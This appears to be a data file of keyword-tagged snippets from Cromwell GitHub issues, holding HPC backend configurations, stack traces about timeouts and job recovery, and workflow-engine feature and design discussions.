""cromwell.ba",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:1199,abort,abort-jobs-on-terminate,1199,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['abort'],['abort-jobs-on-terminate']
Safety,"mit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l mem_free="" + memory_gb + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; /usr/bin/env bash ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)"". submit-docker = """""" ; #location for .sif files and other apptainer tmp, plus lockfile; 	 export APPTAINER_CACHEDIR=<path>; export APPTAINER_PULLFOLDER=<path>; export APPTAINER_TMPDIR=<path>; export LOCK_FILE=""$APPTAINER_CACHEDIR/lockfile""; export IMAGE=$(echo ${docker} | tr '/:' '_').sif; if [ -z $APPTAINER_CACHEDIR ]; then; exit 1; fi; CACHE_DIR=$APPTAINER_CACHEDIR; # Make sure cache dir exists so lock file can be created by flock; mkdir -p $CACHE_DIR; # downloads sifs only one at a time; apptainer sif db doesn't handle concurrency well; out=$(flock --exclusive --timeout 1800 $LOCK_FILE apptainer pull $IMAGE docker://${docker} 2>&1); ret=$?; if [[ $ret == 0 ]]; then; echo ""Successfully pulled ${docker}!""; else; if [[ $(echo $out | grep ""exists"" ) ]]; then; echo ""Image file already exists, ${docker}!""; else; echo ""Failed to pull ${docker}"" >> /dev/stderr; exit $ret; fi; fi; #full path to sif for qsub command; IMAGE=""$APPTAINER_PULLFOLDER/$IMAGE""; qsub \; -terse \; -V \; -b y \; -N ""${job_name}"" \; -wd ""${cwd}"" \; -o ""${out}.qsub"" \; -e ""${err}.qsub"" \; -pe smp ""${cpu}"" \; ${""-l mem_free="" + memory_gb + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; apptainer exec --cleanenv --bind ""${cwd}:${docker_cwd},<path>"" ""$IMAGE"" ""${job_shell}"" ""${docker_script}""; """""". default-runtime-attributes; {; failOnStderr: false; continueOnReturnCode: 0; }; }; }. sge_docker {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. runtime-attributes = """"""; String time = ""11:00:00""; Int cpu = 4; Float? memory_gb; String sge_queue = ""hammer.q""; String? sge_project; String? docker; """""". submit = """"""; qsub \",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7480:3843,timeout,timeout,3843,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480,1,['timeout'],['timeout']
Safety,"mktemp -d /tmp/tmp.XXXXXX)"". runtime-attributes = """"""; Int runtime_minutes = 60; Int cpu = 1; Int memory_mb = 3900; String? docker; """""". submit = """""" \; 'sbatch \; --wait \; -J ${job_name} \; -D ${cwd} \; -o ${out} \; -e ${err} \; -t ${runtime_minutes} \; -p batch,scavenger \; -c ${cpu} \; --mem $(( (${memory_mb} >= ${cpu} * 3900) ? ${memory_mb} : $(( ${cpu} * 3900 )) )) \; -N 1 \; --exclusive \; --wrap ""/bin/bash ${script}""'; """""". submit-docker = """""" \. # Make sure the SINGULARITY_CACHEDIR variable is set. If not use a default; # based on the users home.; module load apptainer; if [ -z $APPTAINER_CACHEDIR ];; then CACHE_DIR=$HOME/.apptainer/cache; else CACHE_DIR=$APPTAINER_CACHEDIR; fi; # Make sure cache dir exists so lock file can be created by flock; mkdir -p $CACHE_DIR; LOCK_FILE=$CACHE_DIR/apptainer_pull_flock; # Create an exclusive filelock with flock. --verbose is useful for; # for debugging, as is the echo command. These show up in `stdout.submit`.; flock --exclusive --timeout 900 $LOCK_FILE \; apptainer exec --containall /mainfs/wrgl/broadinstitute_warp_development/warp/images/${docker}.sif \; echo ""successfully pulled ${docker}!"". # Submit the script to SLURM. 'sbatch \; --wait \; -J ${job_name} \; -D ${cwd} \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr \; -t ${runtime_minutes} \; -p batch,scavenger \; -c ${cpu} \; --mem $(( (${memory_mb} >= ${cpu} * 3900) ? ${memory_mb} : $(( ${cpu} * 3900 )) )) \; -N 1 \; --exclusive \; --wrap \; ""module load apptainer; apptainer exec \; --containall \; --bind /mainfs/wrgl/reference_files/reference_genome/gcp-public-data--broad-references:/mainfs/wrgl/reference_files/reference_genome/gcp-public-data--broad-references \; --bind ${cwd}:${docker_cwd} \; --bind /tmp:/tmp \; /mainfs/wrgl/broadinstitute_warp_development/warp/images/${docker}.sif \; ${job_shell} \; ${docker_script}""'; """""". kill = ""'scancel ${job_id}'"". check-alive = ""'squeue -j ${job_id}'"". job-id-regex = ""Submitted batch job (\\d+).*"". }; }; }; }",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7086:2199,timeout,timeout,2199,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7086,1,['timeout'],['timeout']
Safety,mwell-system-akka.dispatchers.engine-dispatcher-47 INFO - Assigned new job execution tokens to the following groups: 119e11a5: 1; 2024-08-19 14:48:00 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - BT-322 119e11a5:wf_hello.hello:-1:1 is eligible for call caching with read = true and write = true; 2024-08-19 14:48:00 cromwell-system-akka.dispatchers.engine-dispatcher-43 INFO - BT-322 119e11a5:wf_hello.hello:-1:1 cache hit copying nomatch: could not find a suitable cache hit.; 2024-08-19 14:48:00 cromwell-system-akka.dispatchers.engine-dispatcher-43 INFO - 119e11a5-b981-4510-a6d9-b5c26dfbb4e3-EngineJobExecutionActor-wf_hello.hello:NA:1 [UUID(119e11a5)]: Could not copy a suitable cache hit for 119e11a5:wf_hello.hello:-1:1. No copy attempts were made.; 2024-08-19 14:48:00 cromwell-system-akka.dispatchers.backend-dispatcher-84 ERROR - GcpBatchAsyncBackendJobExecutionActor [UUID(119e11a5)wf_hello.hello:NA:1]: Error attempting to Recover(StandardAsyncJob(projects/broad-dsde-cromwell-dev/locations/us-central1/jobs/job-7ce25791-3731-4a69-97f1-b7b65ac8ff71)); java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:805); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:804); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.execute(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExec,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7495:2114,Recover,Recover,2114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7495,1,['Recover'],['Recover']
Safety,mwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor` exception when it tries to recover a running job. Stacktrace:; ```; ERROR - AwsBatchAsyncBackendJobExecutionActor [UUID(4057b0c6)generate_10gb_file.generate_file:NA:1]: Error attempting to Recover(StandardAsyncJob(4704e5c9-3a79-4280-a464-d737f36056ec)); java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:628); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:627); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.execute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:653); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recoverAsync(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:949); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:944); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.executeOrRecover(AwsBatchAsyn,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:1101,recover,recover,1101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,1,['recover'],['recover']
Safety,"mwell.yaml#!/Workflows/post_workflows_version_id_abort. When going through swagger, the abort takes a long time and then gives an error: ; Response Code 500; ""status"": ""error"",; ""message"": ""The server was not able to produce a timely response to your request."". The workflow is removed from WORKFLOW_STORE_ENTRY but the associated jobs are still present in JOB_STORE_ENTRY. . There are no errors in the logs: ; `; 2016-12-12 18:22:26,139 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(8a965a5e)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:29:42,727 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(73be7f27)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:31:29,146 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(13965e09)]: Abort received. Aborting 10 EJEAs; 2016-12-12 18:31:46,093 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(804a56b6)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:32:05,063 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Ab",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:1108,Abort,Abort,1108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"n Get; required); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1501, in _GetProperty; value = _GetPropertyWithoutDefault(prop, properties_file); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1539, in _GetPropertyWithoutDefault; value = callback(); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 693, in _GetGCEProject; return c_gce.Metadata().Project(); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 104, in Project; gce_read.GOOGLE_GCE_METADATA_PROJECT_URI); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py"", line 155, in TryFunc; return func(*args, **kwargs), None; File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 41, in _ReadNoProxyWithCleanFailures; return gce_read.ReadNoProxy(uri); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py"", line 50, in ReadNoProxy; request, timeout=timeout_property).read(); File ""/usr/lib/python2.7/urllib2.py"", line 401, in open; response = self._open(req, data); File ""/usr/lib/python2.7/urllib2.py"", line 419, in _open; '_open', req); File ""/usr/lib/python2.7/urllib2.py"", line 379, in _call_chain; result = func(*args); File ""/usr/lib/python2.7/urllib2.py"", line 1211, in http_open; return self.do_open(httplib.HTTPConnection, req); File ""/usr/lib/python2.7/urllib2.py"", line 1184, in do_open; r = h.getresponse(buffering=True); File ""/usr/lib/python2.7/httplib.py"", line 1072, in getresponse; response.begin(); File ""/usr/lib/python2.7/httplib.py"", line 408, in begin; version, status, reason = self._read_status(); File ""/usr/lib/python2.7/httplib.py"", line 366, in _read_status; line = self.fp.readline(); File ""/usr/lib/python2.7/socket.py"", line 447, in readline; data = self._sock.recv(self._rbufsize); socket.timeout: timed out; :; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400:4310,timeout,timeout,4310,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400,2,['timeout'],['timeout']
Safety,"n ReadNoProxy\n request, timeout=timeout_property).read()\n File \""/usr/lib/python2.7/urllib2.py\"", line 401, in open\n response = self._open(req, data)\n File \""/usr/lib/py; thon2.7/urllib2.py\"", line 419, in _open\n '_open', req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 379, in _call_chain\n result = func(*args)\n File \""/usr/lib/python2.7/urllib; 2.py\"", line 1211, in http_open\n return self.do_open(httplib.HTTPConnection, req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1184, in do_open\n r = h.getresponse(buffering=True); \n File \""/usr/lib/python2.7/httplib.py\"", line 1072, in getresponse\n response.begin()\n File \""/usr/lib/python2.7/httplib.py\"", line 408, in begin\n version, status, reason = self; ._read_status()\n File \""/usr/lib/python2.7/httplib.py\"", line 366, in _read_status\n line = self.fp.readline()\n File \""/usr/lib/python2.7/socket.py\"", line 447, in readline\n data; = self._sock.recv(self._rbufsize)\nsocket.timeout: timed out\n); gs://5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam -> /mnt/loc; al-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam (cp failed: gsutil -q -m cp gs://5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga; /STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam /mnt/local-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam,; command failed: Traceback (most recent call last):\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 75, in <module>\n main()\n File \""/usr/local/s; hare/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 22, in main\n project, account = bootstrapping.GetActiveProjectAndAccount()\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/bootstrapping.py\"", line 205, in GetActiveProjectAndAccount\n project_name = properties.VALUES.core.project.Get(validate=False",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:5877,timeout,timeout,5877,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['timeout'],['timeout']
Safety,"n this issue. In all cases, if Cromwell fails to retrieve the docker hash for a task, for any reason, the corresponding call(s) will NOT be eligible for call caching, neither read nor write, regardless of the call caching configuration in effect. **When to get the hashes and what to do with them:**. 1. Cromwell will lookup the hashes corresponding to docker tags, for all docker attributes in all tasks in a workflow and its subworkflows, at Materialization time.; If the runtime attribute value can't be determined, the task in question will be ineligible for call caching. The only case when that should be true is if the attribute is an expression with variables depending on previous tasks being run. 2. If the hash lookup succeed, Cromwell will use that hash to perform any call cache read / write according to the call caching configuration in effect. It will also provide that hash, along with the original floating tag, to the backend when the job gets dispatched. 3. Backends will choose wether to use the hash or the floating tag. They will report to the engine which one they used, so that the engine can send this information to the metadata. **How to get the hash:**. 1. How to get the hash depends on the backend. Which means, at this time, that only workflows for which the backend is known statically at workflow submission time will be supported. 2. If the task is expected to run on the **Local Backend**, Cromwell will attempt to find the hash corresponding to the tag on the machine where it's being run. This first attempt must be done without executing a `pull` to avoid overriding the current local image, if it exits, with the remote repository version.; If the image is not present locally, cromwell will attempt to `pull` the image locally, and use the hash from the newly retrieved image. 3. If the task is expected to run on a **Non Local Backend**, cromwell will attempt to retrieve the image from a remote repository. The `DockerHashActor` can be used for that effect.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048:1927,avoid,avoid,1927,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048,1,['avoid'],['avoid']
Safety,"n trimmed/merged fastqs with bowtie2s; call bowtie2 { input :; idx_tar = bowtie2_idx_tar,; fastqs = trim_adapter.trimmed_merged_fastqs, #[R1,R2]; paired_end = paired_end,; multimapping = multimapping,; }; }; ```; With the function :; ```; task trim_adapter { # trim adapters and merge trimmed fastqs; # parameters from workflow; Array[Array[File]] fastqs # [merge_id][read_end_id]; Array[Array[String]] adapters # [merge_id][read_end_id]; Boolean paired_end; # mandatory; Boolean? auto_detect_adapter # automatically detect/trim adapters; # optional; Int? min_trim_len # minimum trim length for cutadapt -m; Float? err_rate # Maximum allowed adapter error rate; # for cutadapt -e; # resource; Int? cpu; Int? mem_mb; Int? time_hr; #Commenting this line as a test. PRoblem with hard link; String? disks. command {; python $(which encode_trim_adapter.py) \; ${write_tsv(fastqs)} \; --adapters ${write_tsv(adapters)} \; ${if paired_end then ""--paired-end"" else """"} \; ${if select_first([auto_detect_adapter,false]) then ""--auto-detect-adapter"" else """"} \; ${""--min-trim-len "" + select_first([min_trim_len,5])} \; ${""--err-rate "" + select_first([err_rate,'0.1'])} \; ${""--nth "" + select_first([cpu,2])}; }; output {; # WDL glob() globs in an alphabetical order; # so R1 and R2 can be switched, which results in an; # unexpected behavior of a workflow; # so we prepend merge_fastqs_'end'_ (R1 or R2); # to the basename of original filename; # this prefix will be later stripped in bowtie2 task; Array[File] trimmed_merged_fastqs = glob(""merge_fastqs_R?_*.fastq.gz""); }; runtime {; cpu : select_first([cpu,2]); memory : ""${select_first([mem_mb,'12000'])} MB""; time : select_first([time_hr,24]); disks : select_first([disks,""local-disk 100 HDD""]); }; }; ```. My backend.conf :; ```; include required(classpath(""application"")). backend {; default=""SGE""; providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10000; runtime-a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3876:3257,detect,detect-adapter,3257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3876,1,['detect'],['detect-adapter']
Safety,n(ProcessRunner.scala:20); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.$anonfun$isAlive$1(SharedFileSystemAsyncJobExecutionActor.scala:196); 	at scala.runtime.java8.JFunction0$mcZ$sp.apply(JFunction0$mcZ$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.isAlive(SharedFileSystemAsyncJobExecutionActor.scala:191); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.isAlive$(SharedFileSystemAsyncJobExecutionActor.scala:191); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.isAlive(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.reconnectToExistingJob(SharedFileSystemAsyncJobExecutionActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover$(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:305); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recoverAsync(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:574); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:569); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecove,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2963:1618,recover,recover,1618,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2963,1,['recover'],['recover']
Safety,"ne 408, in begin\n version, status, reason = self._read_status()\n File \""/usr/lib/python2.7/httplib.py\"", line 366, in _read_status\n line = self.fp.readline()\n File \""/usr/lib/python2.7/socket.py\"", line 447, in readline\n data = self._sock.recv(self._rbufsize)\nsocket.timeout: timed out\n)""; at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$.StandardException(JesAsyncBackendJobExecutionActor.scala:63); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionFailure(JesAsyncBackendJobExecutionActor.scala:411); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionFailure(JesAsyncBackendJobExecutionActor.scala:67); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$1.applyOrElse(StandardAsyncExecutionActor.scala:666); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$1.applyOrElse(StandardAsyncExecutionActor.scala:663); at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:16319,recover,recoverWith,16319,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['recover'],['recoverWith']
Safety,ne.wrap(SSLEngine.java:564); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.wrap(SslHandler.java:1041); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.wrapNonAppData(SslHandler.java:927); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1409); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.unwrapNonAppData(SslHandler.java:1327); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.access$1800(SslHandler.java:169); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner.resumeOnEventExecutor(SslHandler.java:1718); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner.access$2000(SslHandler.java:1609); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner$2.run(SslHandler.java:1770); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:174); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:167); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470); at io.grpc.netty.shaded.io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:403); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997); at io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74); at io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30); ... 1 common frames omitted; Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at java.base/sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:388); at java.base/sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:271); at java.base/sun.securit,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:6232,safe,safeExecute,6232,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['safe'],['safeExecute']
Safety,"need, but I decided to err on providing more info over less. The dashboard view has panels of grouped information, categorized by labels on the jobs. Imagine a user had an owner label and a project label on all of their jobs. The dashboard panels would be pivoted by project and owner, and show probably the first ~5-10 labels that have the most running jobs with that label. These panels would be populated with a header that is the key of the cromwell label, a list of values that match that key that the users have access to, and then a summary of their statuses. . The dashboard will be filterable by other labels, but maybe not at first. A use case example there is filtering the image above by a label `key:value` of `flag:archived`. There is a concept of flagging jobs as archived so you don't see them anymore, as a way to get your failures list down to ""inbox 0"" and say ""I've addressed those jobs, I don't want to see them anymore"". So it's possible a user could want to filter those jobs out of their dashboard view as well. v1 will not have this chart pictured and will not have the left panel of server information. ### Ticket Prioritization Suggestions; 1. I would like to start with a spike/design doc and scoping out the amount of effort it would take to support this in Cromwell before end of Q1. ; 2. This ticket can also represent the implementation if Cromwell wants, which we need by end of May to be able to do the front end work before end of Q2. . ### Current Status; Currently, I think this view would require many pings to the cromwell query endpoint with different queries to get back all of the numbers and results. . ### Risks I know of; I don't think this is blocked by the labels endpoint update in #3233, but wanted to mention it in case it is a risk. ### ACs; - The Job Manager Dashboard can be quickly filled in; - The user can choose which labels they want to get this summary information on (i.e. it's not only a fixed set of labels that are supported by Cromwell)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3348:2136,Risk,Risks,2136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3348,2,"['Risk', 'risk']","['Risks', 'risk']"
Safety,netty.request.NettyRequestSender.sendRequest(NettyRequestSender.java:111); at org.asynchttpclient.DefaultAsyncHttpClient.execute(DefaultAsyncHttpClient.java:240); at org.asynchttpclient.DefaultAsyncHttpClient.executeRequest(DefaultAsyncHttpClient.java:209); at org.asynchttpclient.BoundRequestBuilder.execute(BoundRequestBuilder.java:35); at com.softwaremill.sttp.asynchttpclient.AsyncHttpClientBackend.$anonfun$send$1(AsyncHttpClientBackend.scala:53); at com.softwaremill.sttp.asynchttpclient.AsyncHttpClientBackend.$anonfun$send$1$adapted(AsyncHttpClientBackend.scala:42); at cats.effect.IO$.$anonfun$async$1(IO.scala:1042); at cats.effect.IO$.$anonfun$async$1$adapted(IO.scala:1040); at cats.effect.internals.IORunLoop$RestartCallback.start(IORunLoop.scala:329); at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:118); at cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); at cats.effect.IO.unsafeRunAsync(IO.scala:269); at cats.effect.IO.unsafeToFuture(IO.scala:341); at cromwell.languages.util.ImportResolver$.$anonfun$httpResolverWithHeaders$1(ImportResolver.scala:92); at 